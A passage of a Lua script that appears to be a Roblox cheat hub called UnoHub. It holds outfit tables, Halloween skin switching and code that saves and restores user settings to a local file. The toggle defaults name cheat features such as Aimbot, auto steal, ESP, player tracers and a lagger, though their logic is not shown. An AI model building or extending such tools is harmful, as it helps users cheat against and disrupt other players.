	    ["12"] = {
	        hats = "", hair = "111149505826763", headless = false, korblox = "Off",
	        accessories = { 111149505826763 }, clothing = { 8844377623, 101481154733615 },
	        displayName = "12",
	    
	    },
	    ["13"] = {
	        hats = "17274218093", hair = "", headless = false, korblox = "Off",
	        accessories = { 111553288808103, 17274218093, 17387240647 },
	        clothing = { 130666125397672, 91321960147976 },
	        displayName = "13",
	    
	    },
	    ["14"] = {
	        hats = "127788745429250", hair = "", headless = false, korblox = "Off",
	        accessories = { 127788745429250, 143803235928952 },
	        clothing = { 77038549270215, 16717004839 },
	        displayName = "14",
	    
	    },
	    ["15"] = {
	        hats = "8261840689", hair = "", headless = true, korblox = "Right",
	        accessories = { 8261840689 }, clothing = { 7884186381, 13063157758 },
	        displayName = "15",
	    
	    },
	    ["16"] = {
	        hats = "91950080535908", hair = "96954292222783", headless = true, korblox = "Right",
	        accessories = { 91950080535908, 96954292222783, 17309352545, 132404403424262 },
	        clothing = { 9683332649, 13063157758 },
	        displayName = "16",
	    
	    },
	    ["17"] = {
	        hats = "10997283529", hair = "", headless = true, korblox = "Off",
	        accessories = {
	            10997283529, 125085889448130,
	            115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322,
	        },
	        clothing = {},
	        displayName = "17",
	    
	    },
	    ["18"] = {
	        hats = "125157548394108", hair = "", headless = false, korblox = "Off",
	        accessories = {
	            125157548394108, 123231522991173, 74827642361405,
	            115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322,
	        },
	        clothing = {},
	        displayName = "18",
	    
	    },
	    ["19"] = {
	        hats = "136644276218918", hair = "", headless = false, korblox = "Off",
	        accessories = {
	            136644276218918, 132022106987543, 131740907052260,
	            115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322,
	        },
	        clothing = {},
	        displayName = "19",
	    
	    },
	    ["20"] = {
	        hats = "119331031817124", hair = "", headless = true, korblox = "Off",
	        accessories = {
	            119331031817124, 84952305140948,
	            115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322,
	        },
	        clothing = {},
	        displayName = "20",
	    
	    },
	    ["21"] = {
	        hats = "18902416696", hair = "", headless = true, korblox = "Off",
	        accessories = {
	            18902416696, 17739456422, 116750288839357, 12842417046, 122223069519702,
	            115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322,
	        },
	        clothing = {},
	        displayName = "21",
	    
	    },
	    ["22"] = {
	        hats = "13935333090", hair = "", headless = false, korblox = "Off",
	        accessories = { 13935333090, 16110951997, 10632503818 },
	        clothing = {},
	        displayName = "22",
	    
	    },
	    ["23"] = {
	        hats = "74891470", hair = "", headless = true, korblox = "Off",
	        accessories = { 74891470, 4390891467, 91274263831244, 128424248603010, 91151766440767, 17044638424 },
	        clothing = {},
	        displayName = "23",
	    
	    },
	    ["24"] = {
	        hats = "76479271580913", hair = "", headless = true, korblox = "Right",
	        accessories = { 76479271580913, 1402432199, 140627490971265, 128912609563885, 17449551560, 5796531729, 139607718 },
	        clothing = {},
	        displayName = "24",
	    
	    },
	    ["25"] = {
	        hats = "", hair = "", headless = false, korblox = "Both",
	        accessories = { 70414871864071, 14863917259, 133498027006138, 82277826177074 },
	        clothing = {},
	        displayName = "25",
	    
	    },
	    ["26"] = {
	        displayName = "Halloween 1",
	        hats = "",
	        hair = "137816489423089",
	        head = 92670829478194,
	        headless = false,
	        korblox = "Off",
	        accessories = { 137816489423089 },
	        clothing = { 11411687887, 18509017923 },
	    },
	    ["27"] = {
	        displayName = "Halloween 2 (Only for girls)",
	        hats = "13662051809",
	        hair = "72207146497194",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            13662051809,
	            72207146497194,
	            97945688435935,
	            17705761232,
	            73795996211715,
	        },
	        clothing = {
	            80270201543495,
	            71323567783130,
	        },
	    },
	    ["28"] = {
	        displayName = "Halloween 3 (Only for boys)",
	        hats = "12100456942",
	        hair = "6505251102,7667524077,9119178128,9546276497,15370913338",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            12100456942,
	            6505251102,
	            7667524077,
	            9119178128,
	            9546276497,
	            15370913338,
	        },
	        clothing = {
	            7493861040,
	            7493682899,
	        },
	    },
	    ["29"] = {
	        displayName = "Halloween 4",
	        hats = "12882959150427,13674440667",
	        hair = "18452730988",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            12882959150427,
	            12483105503,
	            15798886714,
	            12609010661,
	            14960485308,
	            18452730988,
	            13674440667,
	        },
	        clothing = {
	            12398432826,
	            16345874006,
	        },
	    },
	    ["30"] = {
	        displayName = "Halloween 5 (Only for girls)",
	        hats = "",
	        hair = "18852627262",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            18852627262,
	            18960678027,
	        },
	        clothing = {
	            123047893800339,
	            97980416489541,
	        },
	    },
	    ["31"] = {
	        displayName = "Halloween 6",
	        hats = "131240389071985",
	        hair = "88350063335350,126130856838131",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            75903082647857,
	            109732902840536,
	            88350063335350,
	            126130856838131,
	            131240389071985,
	            69225884,
	        },
	        clothing = {
	            7491895299,
	            135519436423162,
	        },
	    },
	    ["32"] = {
	        displayName = "Halloween 7 (Only for girls)",
	        hats = "107482794036668,124471737365837",
	        hair = "91521942478796,120902864784380",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            797690518189490, -- kawaii angelic doll bangs in black
	            85571067100380, -- red lipstick for emo vampire girls
	            76678704905890, -- Cutest Little Vampire Dress Black
	            78738410008728, -- vampire black gothic bow spikey ruffled dress
	            110942934830080, -- 3.0 halloween vampire dress wings black & red
	            91521942478796, -- long straight dolly pigtails in black
	            120902864784380, -- dolly swept bang anime pigtails
	            107482794036668, -- kawaii black & red gloomy bear hairclip
	            124471737365837, -- Gothic Vkei black Red Lace Headdress
	        },
	        clothing = {
	            102600122623079, -- black socks pick me da hood vkei y2k pants
	            85491760902331, -- black cat halloween top set vkei moe evade
	        },
	    },
	    ["33"] = {
	        displayName = "Halloween 8",
	        hats = "117812965911665",
	        hair = "71172509811066",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            104775928591754, -- vampire cat cloak kawaii 3.0
	            18582391105, -- pv lashes
	            117970362893706, -- medical red and gold blood tear drops
	            128414560977613, -- Newsie Bangs Combo in Original Black
	            71172509811066, -- Straight Long Pigtails in Black
	            117812965911665, -- spider lily + red sakuras
	            9364222982, -- Black Off-Shoulder Puff Sleeves
	            124934069448214, -- gothic lace choker n cross 3.0 black red
	        },
	        clothing = {
	            18285676939, -- vamp pants
	            18291962919, -- i tried to leave him shirt
	        },
	    },
	    ["34"] = {
	        displayName = "Halloween 9",
	        hats = "109459709245296",
	        hair = "108057907822879",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            109459709245296, -- Classic Grunge Slasher Jason Hockey Mask
	            92708416808486, -- Brown Tie Necklace
	            108057907822879, -- Messy Teased Pigtails (Black)
	            83728028938556, -- Guantes Oscuros Semilargos (layered TShirt)
	            116859581552659, -- Blush Fashion Doll Denim Mini Skirt
	        },
	        clothing = {
	            71343586255975, -- Jason pants
	            74749318396084, -- jason shirt
	        },
	    },
	    ["35"] = {
	        displayName = "Halloween 10",
	        hats = "12332887309",
	        hair = "17856346542,79987302423598",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            18962081180, -- black doll button eyes
	            128725113481880, -- Coraline's Dragonfly Hair Clip
	            77116105285140, -- Coraline Bag w Key Portal Necklace
	            17856346542, -- short dark blue pixie bob hair
	            79987302423598, -- dark blue wispy short fairy haircut
	            12332887309, -- Yellow Hoodie Hood
	            15152505989, -- Halloween Holdable Doll
	            115403798916924, -- Wybe Halloween Holdable Doll
	        },
	        clothing = {
	            14978812146, -- coraline halloween pants
	            14736978938, -- matching coraline rain coat jacket shirt
	        },
	    },
	    ["36"] = {
	        displayName = "Halloween 11",
	        hats = "107149034772949",
	        hair = "98442947200069",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            98442947200069, -- Michael Myers Hair, Halloween (1978)
	            107149034772949, -- Michael Myers Mask, Halloween (1978)
	            88522661121854, -- Michael Myers Collar (Halloween) Navy Ver
	            103331193186283, -- Michael Myers Knife, Halloween (1978) (R6)
	        },
	        clothing = {
	            117521754551438, -- Michael Myers Navy - | Halloween 1978 pants
	            117440654176320, -- Michael Myers Navy + | Halloween 1978 shirt
	        },
	    },
	    ["37"] = {
	        displayName = "Halloween 12",
	        hats = "1360068971,11290193548",
	        hair = "113193350876840",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            13000426529, -- Fangs
	            113027081577778, -- face item, name unavailable
	            113193350876840, -- White & red heart shaped gothic long hair v1
	            1360068971, -- Red Iron Horns
	            11290193548, -- Lovely Nurse Hat - Blood
	            8531638230, -- Dark Chain and Spike Necklace 3.0
	        },
	        clothing = {
	            4712120158, -- white nurse suit pants
	            4712123211, -- white nurse suit sleeves
	        },
	    },
	    ["38"] = {
	        displayName = "26",
	        hats = "14374953581,123946546942649",
	        hair = "119060536381731",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            95749345328586, -- Soft dollette laced dress w bow white
	            119060536381731, -- long hime doll hair in brown
	            14374953581, -- White Lace Headband
	            123946546942649, -- White Silk Hair Bow w Lace & Cross
	            138040646568796, -- 3.0 Cute Ribbon Bow Necklace in White
	        },
	        clothing = {
	            79592585241668, -- angelic pants
	            18433215803, -- shirt
	        },
	    },
	    ["39"] = {
	        displayName = "27",
	        hats = "72903137528791,132972648685974",
	        hair = "129787915908926",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            129787915908926, -- vampire goth emo wispy long straight hair gray
	            72903137528791, -- Thorn Crown 3.0
	            132972648685974, -- hat, name unavailable
	            103646035681550, -- neck accessory, name unavailable
	            71416779191240, -- waist accessory, name unavailable
	        },
	        clothing = {
	            114909014493800, -- basic black pants
	            136021052946000, -- white vkei vampire shirt
	        },
	    },
	    ["40"] = {
	        displayName = "28",
	        hats = "6598332297",
	        hair = "93547753196756",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            12660565359, -- Off Shoulder Canvas Backpack
	            17355901854, -- sweet bunny bandaid in light pink
	            117825516420618, -- Newsie Bangs Combo in Original Black
	            11716912583, -- Black Earbuds
	            93547753196756, -- Cutesy Long Black Voluminous Pigtails
	            6598332297, -- Black Ruffle Hat
	        },
	        clothing = {
	            823175006146560, -- ripped pants
	            126288580015689, -- shirt
	        },
	    },
	    ["41"] = {
	        displayName = "29",
	        hats = "1191135761,113056370363852",
	        hair = "102108907789828",
	        headless = false,
	        korblox = "Off",
	        accessories = {
	            13489321109, -- Glasses
	            16491292288, -- super cute lashes
	            78062543593672, -- natural lashes
	            119532482624098, -- Super Super Happy Face (dusty rose)
	            124710562897689, -- Doll Eyelashes + Eyeliner
	            128414560977613, -- Newsie Bangs Combo in Original Black
	            102108907789828, -- hair, name unavailable
	            1191135761, -- Red Void Star
	            113056370363852, -- Bow + Cross Hairclips Black
	            132320850350454, -- neck accessory
	        },
	        clothing = {
	            13055678980, -- regular black dh y2k emo pick me cnp pants
	            12024210751, -- lana shirt
	        },
	    },
	}
	-- Halloween-only outfits; additional themed sets can be added here later.
	local HALLOWEEN_VIOLETTE_SKIN_SETS = {
		["26"] = VIOLETTE_SKIN_SETS["26"],
		["27"] = VIOLETTE_SKIN_SETS["27"],
		["28"] = VIOLETTE_SKIN_SETS["28"],
		["29"] = VIOLETTE_SKIN_SETS["29"],
		["30"] = VIOLETTE_SKIN_SETS["30"],
		["31"] = VIOLETTE_SKIN_SETS["31"],
		["32"] = VIOLETTE_SKIN_SETS["32"],
		["33"] = VIOLETTE_SKIN_SETS["33"],
		["34"] = VIOLETTE_SKIN_SETS["34"],
		["35"] = VIOLETTE_SKIN_SETS["35"],
		["36"] = VIOLETTE_SKIN_SETS["36"],
		["37"] = VIOLETTE_SKIN_SETS["37"],
	}
	VIOLETTE_SKIN_SETS["26"] = nil
	VIOLETTE_SKIN_SETS["27"] = nil
	VIOLETTE_SKIN_SETS["28"] = nil
	VIOLETTE_SKIN_SETS["29"] = nil
	VIOLETTE_SKIN_SETS["30"] = nil
	VIOLETTE_SKIN_SETS["31"] = nil
	VIOLETTE_SKIN_SETS["32"] = nil
	VIOLETTE_SKIN_SETS["33"] = nil
	VIOLETTE_SKIN_SETS["34"] = nil
	VIOLETTE_SKIN_SETS["35"] = nil
	VIOLETTE_SKIN_SETS["36"] = nil
	VIOLETTE_SKIN_SETS["37"] = nil
	_G.__UnoHalloweenVioletteSkinSets = HALLOWEEN_VIOLETTE_SKIN_SETS
	local function getVioletteSkinSet(mode)
		local key = tostring(mode or "1")
		local halloweenSkin = HALLOWEEN_VIOLETTE_SKIN_SETS[key]
		if toggleStates["Halloween Mode"] == true and halloweenSkin then return halloweenSkin end
		return VIOLETTE_SKIN_SETS[key]
	end
	local function refreshVioletteSkinCatalog()
		local activeSets = {}
		local allKeys = {}
		local halloweenActive = toggleStates["Halloween Mode"] == true
		for key, skin in pairs(HALLOWEEN_VIOLETTE_SKIN_SETS) do
			allKeys[key] = true
			if halloweenActive then
				activeSets[key] = skin
			end
		end
		allKeys["38"] = true
		allKeys["39"] = true
		allKeys["40"] = true
		allKeys["41"] = true
		if not halloweenActive then
			activeSets["38"] = VIOLETTE_SKIN_SETS["38"]
			activeSets["39"] = VIOLETTE_SKIN_SETS["39"]
			activeSets["40"] = VIOLETTE_SKIN_SETS["40"]
			activeSets["41"] = VIOLETTE_SKIN_SETS["41"]
		end
		local order = {}
		for key in pairs(allKeys) do table.insert(order, key) end
		table.sort(order, function(a, b)
			local numberA, numberB = tonumber(a), tonumber(b)
			if numberA and numberB then return numberA < numberB end
			if numberA then return true end
			if numberB then return false end
			return a < b
		end)
		_G._KawatanSkinSets = activeSets
		_G._KawatanSkinSetOrder = order
		return activeSets
	end
	refreshVioletteSkinCatalog()
	_G._KawatanSkinColor = _G._KawatanSkinColor or "1"
	do
		local assetProperties = {
			[11] = "Shirt", [12] = "Pants", [2] = "GraphicTShirt",
			[8] = "HatAccessory", [41] = "HairAccessory", [42] = "FaceAccessory",
			[43] = "NeckAccessory", [44] = "ShouldersAccessory", [45] = "FrontAccessory",
			[46] = "BackAccessory", [47] = "WaistAccessory", [64] = "TShirtAccessory",
			[65] = "ShirtAccessory", [66] = "PantsAccessory", [67] = "JacketAccessory",
			[68] = "SweaterAccessory", [69] = "ShortsAccessory", [70] = "LeftShoeAccessory",
			[71] = "RightShoeAccessory", [72] = "DressSkirtAccessory",
		}
		local function addPreviewAsset(description, assetId)
			local ok, info = pcall(function()
				return game:GetService("MarketplaceService"):GetProductInfo(assetId, Enum.InfoType.Asset)
			end)
			if not ok or not info then return end
			local property = assetProperties[tonumber(info.AssetTypeId)]
			if not property then return end
			if property == "Shirt" or property == "Pants" or property == "GraphicTShirt" then
				pcall(function() description[property] = assetId end)
			else
				local current = ""
				pcall(function() current = tostring(description[property] or "") end)
				pcall(function() description[property] = current == "" and tostring(assetId) or (current .. "," .. tostring(assetId)) end)
			end
		end
		_G._KawatanBuildSetDescription = function(setName)
			local skin = getVioletteSkinSet(setName)
			if not skin then return nil end
			local base
			pcall(function()
				local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
				if hum then base = hum:GetAppliedDescription() end
			end)
			local description = base and base:Clone() or Instance.new("HumanoidDescription")
			for _, property in ipairs({"HatAccessory", "HairAccessory", "FaceAccessory", "NeckAccessory", "ShouldersAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "ShirtAccessory", "PantsAccessory", "JacketAccessory", "SweaterAccessory", "ShortsAccessory", "TShirtAccessory", "DressSkirtAccessory"}) do pcall(function() description[property] = "" end) end
			pcall(function() description.Shirt = 0; description.Pants = 0; description.GraphicTShirt = 0 end)
			pcall(function() description.HatAccessory = skin.hats or ""; description.HairAccessory = skin.hair or ""; if skin.head then description.Head = skin.head end end)
			for _, id in ipairs(skin.accessories or {}) do addPreviewAsset(description, id) end
			for _, id in ipairs(skin.clothing or {}) do addPreviewAsset(description, id) end
			return description
		end
	end

	local toggleDefaults = {}
	toggleDefaults["Inf Jump"] = false
	toggleDefaults["TP Down"] = false
	toggleDefaults["Auto TP Down"] = false
	toggleDefaults["Anti Ragdoll"] = false
	toggleDefaults["Ragdoll Counter"] = false
	toggleDefaults["Medusa Counter"] = false
	toggleDefaults["Aimbot"] = false
	toggleDefaults["Autoplay"] = false
	toggleDefaults["Drop"] = false
	toggleDefaults["auto steal"] = false
	toggleDefaults["Steal Bar"] = true
	toggleDefaults["ESP Players"] = false
	toggleDefaults["Player Tracers"] = false
	toggleDefaults["Show Buttons"] = false
	toggleDefaults["Lock Buttons"] = false
	toggleDefaults["Show FPS"] = false
	toggleDefaults["FPS Boost"] = false
	toggleDefaults["Anti Lag"] = false
	toggleDefaults["Lagger"] = false
	toggleDefaults["Speed Boost"] = false
	toggleDefaults["Toggle UI"] = true
	toggleDefaults["Auto Steal Speed"] = false
	toggleDefaults["Auto Carry Speed"] = false
	toggleDefaults["Carry Speed"] = false
	toggleDefaults["Unwalk"] = false
	toggleDefaults["Harder Hit Anim"] = false
	toggleDefaults["Animations"] = false
	toggleDefaults["Custom FOV"] = false
	toggleDefaults["Custom Font"] = false
	toggleDefaults["Stretchz Res"] = false
	toggleDefaults["Sky Changer"] = false
	toggleDefaults["Violette Custom Skins"] = false
	toggleDefaults["Headless Visual"] = false
	toggleDefaults["Korblox Visual"] = false
	toggleDefaults["Halloween Mode"] = false
	toggleDefaults["Anti Die"] = false
	for k, v in pairs(toggleDefaults) do toggleStates[k] = v end

	local lastSavedConfigData = nil
	local pendingConfigData = nil
	local configSaveGeneration = 0
	local function flushConfig(data)
	if not data or data == lastSavedConfigData then return end
	pcall(writefile, CONFIG_FILE, data)
	lastSavedConfigData = data
	end
	local function saveConfig()
	local lines = {}
	for name, state in pairs(toggleStates) do
	if not transientToggles[name] then
	table.insert(lines, "T:" .. name .. "=" .. tostring(state))
	end
	end
	for name, state in pairs(mobileShortcutStates) do
	table.insert(lines, "S:" .. name .. "=" .. tostring(state))
	end
	for name, state in pairs(mobileBtnPlaced) do
	table.insert(lines, "B:" .. name .. "=" .. tostring(state))
	end
	for k, v in pairs(speedValues) do
	table.insert(lines, "V:" .. k .. "=" .. tostring(v))
	end
	for k, v in pairs(autoStealValues) do
	table.insert(lines, "A:" .. k .. "=" .. tostring(v))
	end
	for _, cs in ipairs(customSpeeds) do
	table.insert(lines, "C:" .. cs.name .. "=" .. cs.boost .. "," .. cs.steal)
	end
	if _G.__UnoHub_Anims then
	for k, v in pairs(_G.__UnoHub_Anims) do
	table.insert(lines, "N:" .. k .. "=" .. v)
	end
	end
	table.insert(lines, "M:selectedMode=" .. selectedMode)
	table.insert(lines, "M:optimizerMode=" .. tostring(_G.__optimizerMode or "Ultra"))
	table.insert(lines, "M:autoplayMode=" .. (_G.__autoplayMode or "Full"))
	table.insert(lines, "M:skyIndex=" .. (tostring(_G.__skyGetIndex and _G.__skyGetIndex() or 1)))
	table.insert(lines, "M:skyMode=" .. tostring(_G.__UnoSkyChangerMode or "blue"))
	table.insert(lines, "M:violetteSkinMode=" .. tostring(violetteSkinMode))
table.insert(lines, "M:batSkinMode=" .. tostring(batSkinMode or "Default"))
	table.insert(lines, "M:katanaIndex=" .. (tostring(_G.__katanaGetIndex and _G.__katanaGetIndex() or 1)))
	table.insert(lines, "M:autoStealMode=" .. ((autoStealMode == "v2") and "v2" or "v1"))
	table.insert(lines, "M:carrySpeedMode=v2")
	table.insert(lines, "M:dropMode=" .. ((_G.__UnoDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"))
	table.insert(lines, "M:infJumpMode=" .. (_G.__UnoInfJumpMode or "hold"))
	table.insert(lines, "M:panelVisible=" .. tostring(_G.__UnoPanelVisible ~= false))
	table.insert(lines, "M:tabPosition=" .. tostring(_G.__UnoTabPosition or "Down"))
	table.insert(lines, "M:batVersion=" .. tostring(_G.__batVersion or 1))
	table.insert(lines, "M:buttonsSize=" .. tostring(_G.__UnoButtonsSize or 1))
	table.insert(lines, "M:tpBatV2Distance=" .. tostring(math.clamp(tonumber(_G.__tpBatV2Distance) or 8, 0, 100)))
	if _G.__UnoAnimationPreset then
	table.insert(lines, "M:animationPreset=" .. tostring(_G.__UnoAnimationPreset))
	end
	table.insert(lines, "M:guiTheme=" .. tostring(_G.__UnoGuiTheme or "GUI 1"))
	table.insert(lines, "M:customFont=" .. tostring(_G.UnoFontChoice or "Default"))
	table.insert(lines, "M:themePrimary=" .. (_G.__UnoThemePrimary or "BLACK"))
	table.insert(lines, "M:themeSecondary=" .. (_G.__UnoThemeSecondary or "BLUE"))
	table.insert(lines, "M:autoGrabExpanded=" .. tostring(_G["_UnoHub_UI_AutoGrabExpanded"] ~= false))
	table.insert(lines, "M:autoGrabBarScale=" .. tostring(_G["_UnoHub_UI_AutoGrabBarScale"] or 1))
	for feat, key in pairs(FeatureKeybinds) do
	if key then
	local keyName
	if type(key) == "string" then
	keyName = key
	else
	keyName = tostring(key):match("KeyCode%.(.+)") or tostring(key)
	end
	table.insert(lines, "K:" .. feat .. "=" .. keyName)
	end
	end
	if _G["_UnoHub_UI_MenuPos"] then
	local pos = _G["_UnoHub_UI_MenuPos"]
	if pos.x and pos.y then
	table.insert(lines, "P:menuPos=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	table.insert(lines, "M:introMusicIndex=" .. tostring(selectedIntroMusicIndex))
	table.insert(lines, "M:bgIndex=" .. tostring(_G["_UnoHub_UI_BgIndex"] or 1))
	if _G.__toggleBtn then
	table.insert(lines, "P:toggleBtn=" .. math.floor(_G.__toggleBtn.Position.X.Offset) .. "," .. math.floor(_G.__toggleBtn.Position.Y.Offset))
	end

	for name, pos in pairs(mobileButtonPositions) do
	if pos.x and pos.y then
	local extra = ""
	if pos.xs and pos.ys then extra = ":" .. pos.xs .. ":" .. pos.ys end
	table.insert(lines, "P:mobileBtn_" .. name .. "=" .. math.floor(pos.x) .. "," .. math.floor(pos.y) .. extra)
	end
	end
	for name, pos in pairs(quickButtonPositions) do
	if pos.x and pos.y then
	table.insert(lines, "P:quickBtn_" .. name .. "=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_UnoHub_UI_SpeedFramePos"] then
	local pos = _G["_UnoHub_UI_SpeedFramePos"]
	if pos.x and pos.y then
	table.insert(lines, "P:speedFrame=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_UnoHub_EnemyWidget_SaveHook"] then pcall(_G["_UnoHub_EnemyWidget_SaveHook"]) end
	if _G["_UnoHub_UI_EnemyWidgetPos"] then
	local pos = _G["_UnoHub_UI_EnemyWidgetPos"]
	if pos.x and pos.y then
	table.insert(lines, "P:enemyWidget=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_UnoHub_UI_AutoGrabBarPos"] then
	local pos = _G["_UnoHub_UI_AutoGrabBarPos"]
	if pos.x and pos.y then
	table.insert(lines, "P:autoGrabBar=" .. math.floor(pos.x) .. "," .. math.floor(pos.y))
	end
	end
	if _G["_UnoHub_UI_AutoGrabBarSize"] then
	table.insert(lines, "P:autoGrabBarSize=" .. tostring(_G["_UnoHub_UI_AutoGrabBarSize"]))
	end
	if _G["_UnoHub_UI_ModernMiniPos"] then
	local pos = _G["_UnoHub_UI_ModernMiniPos"]
	if pos.x and pos.y then table.insert(lines, "P:modernMini=" .. math.floor(pos.x) .. "," .. math.floor(pos.y)) end
	end
	local data = table.concat(lines, "\n")
	if data == lastSavedConfigData or data == pendingConfigData then return end
	pendingConfigData = data
	_G["_UnoHub_UI_Data"] = data
	configSaveGeneration = configSaveGeneration + 1
	local generation = configSaveGeneration

	task.delay(0.2, function()
	if generation ~= configSaveGeneration or pendingConfigData ~= data then return end
	pendingConfigData = nil
	flushConfig(data)
	end)
	end
	_G.__UnoTrackStopper(function()
	if pendingConfigData then flushConfig(pendingConfigData); pendingConfigData = nil end
	end)

	local function deactivateOtherAimbots(keepName)
	local changed = false
	for _, name in ipairs({ "Aimbot", "TP Bat" }) do
	if name ~= keepName and name ~= "TP Bat" and toggleStates[name] then
	toggleStates[name] = false
	changed = true
	local setter = toggleStateSetters[name]
	if setter then pcall(setter, false) end
	if FeaturePostToggle[name] then pcall(FeaturePostToggle[name], false) end
	end
	end
	if changed then saveConfig() end
	end

	local function deactivateBatExclusive(keepName)
	local changed = false
	for _, name in ipairs({ "Aimbot", "TP Bat" }) do
	if name ~= keepName and name ~= "TP Bat" and toggleStates[name] then
	toggleStates[name] = false
	changed = true
	local setter = toggleStateSetters[name]
	if setter then pcall(setter, false) end
	if FeaturePostToggle[name] then pcall(FeaturePostToggle[name], false) end
	end
	end
	if changed then saveConfig() end
	end
	_G.__deactivateBatExclusive = deactivateBatExclusive

	local function loadConfig()
	local data = nil
	local ok, result = pcall(readfile, CONFIG_FILE)
	if ok and result and #result > 0 then
	data = result
	elseif _G["_UnoHub_UI_Data"] and #_G["_UnoHub_UI_Data"] > 0 then
	data = _G["_UnoHub_UI_Data"]
	end
	if not data then return end
	for line in data:gmatch("[^\n]+") do
	local prefix = line:sub(1, 2)
	local rest = line:sub(3)
	local k, v = rest:match("([^=]+)=(.+)")
	if k and v then
	k = k:match("^%s*(.-)%s*$")
	v = v:match("^%s*(.-)%s*$")
	if prefix == "T:" and k == "Animaciones" then k = "Animations" end
	if prefix == "T:" and toggleStates[k] ~= nil and not transientToggles[k] then
	toggleStates[k] = (v == "true")
	elseif prefix == "S:" then
	mobileShortcutStates[k] = (v == "true")
	elseif prefix == "B:" then
	mobileBtnPlaced[k] = (v == "true")
	elseif prefix == "V:" and speedValues[k] ~= nil then
	local num = tonumber(v)
	if num then
	speedValues[k] = num
	if k == "NormalBoost" then normalSpeed = num end
	if k == "NormalSteal" then carrySpeed = num end
	if k == "LaggerBoost" then laggerSpeed = num end
	end
	elseif prefix == "N:" then
	_G.__savedAnimations = _G.__savedAnimations or {}
	_G.__savedAnimations[k] = v
	elseif prefix == "M:" then
	if k == "introMusicIndex" then
	selectedIntroMusicIndex = tonumber(v) or 2
	elseif k == "bgIndex" then
	_G["_UnoHub_UI_BgIndex"] = tonumber(v)
	elseif k == "selectedMode" then
	if v == "Normal" or v == "Lagger" or v == "Desync" then selectedMode = v end
	elseif k == "autoplayMode" then
	if v == "Full" or v == "Semi" then _G.__autoplayMode = v end
	elseif k == "skyIndex" then
	_G.__savedSkyIndex = tonumber(v)
	elseif k == "skyMode" then
	if v == "day" or v == "blue" or v == "night" then _G.__UnoSkyChangerMode = v end
	elseif k == "katanaIndex" then
	_G.__savedKatanaIndex = tonumber(v)
	elseif k == "autoStealMode" then

	if v == "v3" then v = "v1" end
	if v == "v1" or v == "v2" then autoStealMode = v end
	elseif k == "carrySpeedMode" then
	carrySpeedMode = "v2"
	elseif k == "optimizerMode" then
	if v == "Normal" or v == "Ultra" then _G.__optimizerMode = v end
	elseif k == "dropMode" then
	_G.__UnoDropMode = (v == "Jump Drop") and "Jump Drop" or "Stand Drop"
	elseif k == "infJumpMode" then
	if v == "hold" or v == "manual" then _G.__UnoInfJumpMode = v end
	elseif k == "autoGrabExpanded" then
	_G["_UnoHub_UI_AutoGrabExpanded"] = (v == "true")
	elseif k == "autoGrabBarScale" then
	_G["_UnoHub_UI_AutoGrabBarScale"] = math.clamp(tonumber(v) or 1, 0.6, 1.6)
	elseif k == "panelVisible" then
	_G.__UnoPanelVisible = (v == "true")
	toggleStates["Toggle UI"] = _G.__UnoPanelVisible
	elseif k == "tabPosition" then
	if v == "Left" or v == "Down" then _G.__UnoTabPosition = v end
	elseif k == "themePrimary" then
	if v == "BLACK" or v == "WHITE" then _G.__UnoThemePrimary = v end
	elseif k == "themeSecondary" then
	if v == "BLUE" or v == "RED" or v == "CONTRAST" then _G.__UnoThemeSecondary = v end
	elseif k == "buttonsSize" then
	local size = tonumber(v)
	if size and size == size and math.abs(size) < math.huge then
	_G.__UnoButtonsSize = math.clamp(size, 0.5, 2)
	end
	elseif k == "violetteSkinMode" then
	violetteSkinMode = (VIOLETTE_SKIN_SETS[v] or HALLOWEEN_VIOLETTE_SKIN_SETS[v]) and v or "1"
	elseif k == "batSkinMode" then
		local validBatSkinModes = { ["Default"] = true, ["Abyss Blue"] = true, ["Venom Green"] = true, ["Royal Gold"] = true, ["Velvet Rose"] = true, ["Crimson Night"] = true, ["RGB"] = true }
		batSkinMode = validBatSkinModes[v] and v or "Default"
		elseif k == "batVersion" then
	_G.__batVersion = tonumber(v) == 2 and 2 or 1
	if _G.__batVersionPill then _G.__batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1) end
	elseif k == "tpBatV2Distance" then
	_G.__tpBatV2Distance = math.clamp(tonumber(v) or 8, 0, 100)
	elseif k == "animationPreset" then
	_G.__UnoAnimationPreset = v
	elseif k == "customFont" then
	_G.UnoFontChoice = tostring(v or "Default")
	elseif k == "guiTheme" then
	_G.__UnoGuiTheme = "GUI 1"
	end
	elseif prefix == "A:" and autoStealValues[k] ~= nil then
	local num = tonumber(v)
	if num then autoStealValues[k] = num end
	elseif prefix == "C:" then
	local boostStr, stealStr = v:match("([^,]+),([^,]+)")
	if boostStr and stealStr then
	table.insert(customSpeeds, { name = k, boost = tonumber(boostStr) or 59, steal = tonumber(stealStr) or 29 })
	end
	elseif prefix == "K:" then
	if mouseButtonDisplay[v] then
	FeatureKeybinds[k] = v
	else
	local okKey, key = pcall(function() return Enum.KeyCode[v] end)
	if okKey then FeatureKeybinds[k] = key end
	end
	elseif prefix == "P:" then
	if k == "menuPos" then
	local mx, my = v:match("(-?%d+),(-?%d+)")
